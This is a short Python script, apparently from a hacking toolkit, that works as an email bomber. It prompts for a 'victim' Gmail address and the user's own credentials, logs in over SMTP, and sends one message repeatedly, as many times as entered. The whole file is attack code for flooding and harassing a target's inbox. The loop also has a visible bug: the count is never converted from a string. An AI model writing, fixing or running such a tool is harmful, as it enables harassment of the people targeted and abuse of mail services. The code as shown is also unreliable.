import sys, platform, time, os, urllib
import random, string, smtplib
from time import sleep
from getpass import getpass
from subprocess import call
import color
from color import *

############################################################################
def smtp():
    attack = '@gmail.com'
    phone_num = input(color.UNDERLINE + ''+T+'Victims email>' + color.END) + str(attack)
    gmail = input(color.UNDERLINE + ''+T+'Your Email>' + color.END)
    password = getpass((color.UNDERLINE + ''+T+'Password>' + color.END))

    o = smtplib.SMTP("smtp.gmail.com:587")
    o.starttls()
    o.login(gmail, password)
    subject = input(color.UNDERLINE + ''+T+'Subject>' + color.END)
    message = input(color.UNDERLINE + ''+T+'Message to send>' + color.END)
    counter = input(color.UNDERLINE + ''+T+'How many times>' + color.END)
    spam_msg = "From: {} \r\nTo: {} \r\nSubject: {} \r\n\r\n {}".format(gmail, phone_num, subject, message)

    sleep(1)
    print(""+G+"[*] Sending...")
    for i in range(counter):
        o.sendmail(gmail, phone_num, spam_msg)
    print(''+G+'[*] Success! Emails Sent! '+W+'')
